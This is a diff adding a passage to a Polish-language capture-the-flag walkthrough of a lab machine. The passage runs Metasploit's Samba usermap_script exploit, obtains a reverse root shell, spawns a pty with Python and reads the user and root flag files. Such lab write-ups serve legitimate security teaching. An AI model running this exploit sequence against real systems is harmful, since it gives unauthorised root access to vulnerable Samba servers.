@@ -203,6 +203,105 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 Shellcodes: No Results
 ```
 
-Na powyższym zrzucie widzimy, że mamy kilka możliwości do wyboru, ale najciekawsza wydaje się być opcja "'Username' map script' Command Execution (Metasploit)"
+Na powyższym zrzucie widzimy, że mamy kilka możliwości do wyboru, ale najciekawsza wydaje się być opcja "'Username' map script' Command Execution (Metasploit)". Spróbujmy:
+```bash
+msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 10.10.14.36:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo UomlPiNriGJ5FeAm;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "UomlPiNriGJ5FeAm\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.36:4444 -> 10.10.10.3:55173) at 2020-09-21 18:52:26 +0000
+
+whoami
+root
+```
+Bingo! Udało się, widzimy też, że od razu działamy jako użytkownik root więc dalsze podnoszenie uprawnień nie jest potrzebne. Możemy przejść do szukania flag.
+
+# Szukamy flag
+
+Flagi dla użytkowników zazwyczaj znajduja się w ich katalogu domowym (/home) a dla roota w /root. Najpierw jednak stwórzmy sobie pełnoprawną powłokłę, będzie łątwiej się poruszać po systemie. Jednym ze sposobów jest użycie do tego pythona, który zazwyczaj jest dosępny w każdym systemie Linux.
+
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+sh-3.2# whoami
+whoami
+root
+sh-3.2# pwd
+pwd
+/
+```
+
+Poszukajmy zatem flag:
+
+```bash
+sh-3.2# ls -lah
+ls -lah
+total 97K
+drwxr-xr-x  21 root root 4.0K May 20  2012 .
+drwxr-xr-x  21 root root 4.0K May 20  2012 ..
+drwxr-xr-x   2 root root 4.0K May 13  2012 bin
+drwxr-xr-x   4 root root 1.0K May 13  2012 boot
+lrwxrwxrwx   1 root root   11 Apr 28  2010 cdrom -> media/cdrom
+drwxr-xr-x  13 root root  14K Sep 18 11:09 dev
+drwxr-xr-x  95 root root 4.0K Sep 18 11:09 etc
+drwxr-xr-x   6 root root 4.0K Mar 14  2017 home
+drwxr-xr-x   2 root root 4.0K Mar 16  2010 initrd
+lrwxrwxrwx   1 root root   32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
+drwxr-xr-x  13 root root 4.0K May 13  2012 lib
+drwx------   2 root root  16K Mar 16  2010 lost+found
+drwxr-xr-x   4 root root 4.0K Mar 16  2010 media
+drwxr-xr-x   3 root root 4.0K Apr 28  2010 mnt
+-rw-------   1 root root  15K Sep 18 11:10 nohup.out
+drwxr-xr-x   2 root root 4.0K Mar 16  2010 opt
+dr-xr-xr-x 111 root root    0 Sep 18 11:09 proc
+drwxr-xr-x  13 root root 4.0K Sep 18 11:10 root
+drwxr-xr-x   2 root root 4.0K May 13  2012 sbin
+drwxr-xr-x   2 root root 4.0K Mar 16  2010 srv
+drwxr-xr-x  12 root root    0 Sep 18 11:09 sys
+drwxrwxrwt   4 root root 4.0K Sep 18 12:02 tmp
+drwxr-xr-x  12 root root 4.0K Apr 28  2010 usr
+drwxr-xr-x  15 root root 4.0K May 20  2012 var
+lrwxrwxrwx   1 root root   29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
+sh-3.2# cd /home
+cd /home
+sh-3.2# ls
+ls
+ftp  makis  service  user
+sh-3.2# cd makis
+cd makis
+sh-3.2# ls -lah
+ls -lah
+total 28K
+drwxr-xr-x 2 makis makis 4.0K Mar 14  2017 .
+drwxr-xr-x 6 root  root  4.0K Mar 14  2017 ..
+-rw------- 1 makis makis 1.1K Mar 14  2017 .bash_history
+-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
+-rw-r--r-- 1 makis makis 2.9K Mar 14  2017 .bashrc
+-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
+-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
+-rw-r--r-- 1 makis makis   33 Mar 14  2017 user.txt
+sh-3.2# cat user.txt
+cat user.txt
+***
+sh-3.2# cd /root
+cd /root
+sh-3.2# ls
+ls
+Desktop  reset_logs.sh	root.txt  vnc.log
+sh-3.2# cat root.txt
+cat root.txt
+***
+
+```
 
 # Podsumowanie
